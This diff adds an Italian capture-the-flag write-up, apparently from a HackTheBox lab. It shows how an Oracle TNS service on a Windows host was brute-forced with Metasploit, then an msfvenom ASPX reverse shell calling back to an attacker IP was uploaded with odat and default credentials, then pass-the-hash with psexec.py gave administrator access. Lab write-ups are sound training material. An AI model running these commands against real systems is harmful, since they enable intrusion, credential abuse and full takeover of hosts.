@@ -1,0 +1,34 @@
+Porte aperte solite, smb chiuso, non accessibile e sito completamente inutile
+
+Porta aperta e vulnarible 1521 perchè usa TNS. Utilizzo metasploit
+Cercando su google si utilizza subito il TNS ed il SID.
+
+La prima opzione è un brute force dell'SID
+Trova diversi SID, bisogna provarli singolarmente
+
+Si procede con il modulo oracle login che utilizza il SID che abbiamo estratto
+Procede nel cercare un Username con un attacco brute force
+
+La macchina è windows, dobbiamo quindi generare intanto un payload astx che è essenzialmente una reverse shell per windows
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4545 -f aspx -o shell.aspx
+
+odat semplicemente script per penetration testing contro database Oracle
+
+Una volta trovato username e password grazie metasploit possiamo usare odat con le credenziali e la shell creata
+python3 odat.py dbmsxslprocessor -s 10.10.10.82 -U scott -P tiger -d XE --putFile "c:\inetpub\wwwroot" "shell.aspx" "/home/sjay/shell.aspx" --sysdba
+
+Dopo putfile devo inserire il percorso nel quale inserirò la shell. Dopo il nome, ed infine il percorso di dove si trova la shell nel mio dispositivo locale
+
+All'interno di metasploit avvio lo script multi/handler e setto un listener al mio indirizzo ip specificando che sto analizzando una reverse shell di un sistema windows x64
+
+Una volta avviato vado nel browser con l'estensione /shell.aspx
+ricarico la pagina e metapsploit cattura la shell. Sono dentro, prendo la user.flag
+
+All'interno del Desktop è presente un file su dropbox che mi permette di ricavare la hash della password dell'administrator.
+Posso quindi chiudere e provare a catturare una bash root tramite il comando psexec.py
+
+python3 /home/sjay/Downloads/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b434b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82 administrator@10.10.10.82
+
+Sono dentro come administrator 
+
+
